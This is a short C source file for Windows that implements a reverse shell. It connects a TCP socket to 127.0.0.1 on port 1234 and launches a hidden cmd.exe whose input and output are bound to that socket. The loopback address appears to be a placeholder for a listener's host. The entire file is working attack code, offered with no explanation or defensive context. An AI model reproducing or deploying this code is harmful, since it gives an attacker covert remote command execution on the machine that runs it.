
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_ 
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

void main(void)
{
	PROCESS_INFORMATION pi;
	STARTUPINFO         si;
	WSADATA             wsa;
	SOCKET              s;
	struct sockaddr_in  sa;
	u_long              ip;

	WSAStartup(MAKEWORD(2, 0), &wsa);

	s = WSASocket(AF_INET, SOCK_STREAM,
		IPPROTO_IP, NULL, 0, 0);

	ip = inet_addr("127.0.0.1");

	sa.sin_family = AF_INET;
	sa.sin_port = htons(1234);

	memcpy((void*)&sa.sin_addr,
		(void*)&ip, sizeof(ip));

	if (!connect(s, (struct sockaddr*)&sa, sizeof(sa)))
	{
		memset((void*)&si, 0, sizeof(si));

		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESTDHANDLES;
		si.hStdInput = (HANDLE)s;
		si.hStdOutput = (HANDLE)s;
		si.hStdError = (HANDLE)s;

		if (CreateProcess(NULL, "cmd", NULL, NULL,
			TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
		{
			WaitForSingleObject(pi.hProcess, INFINITE);
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		}
	}
	closesocket(s);
}
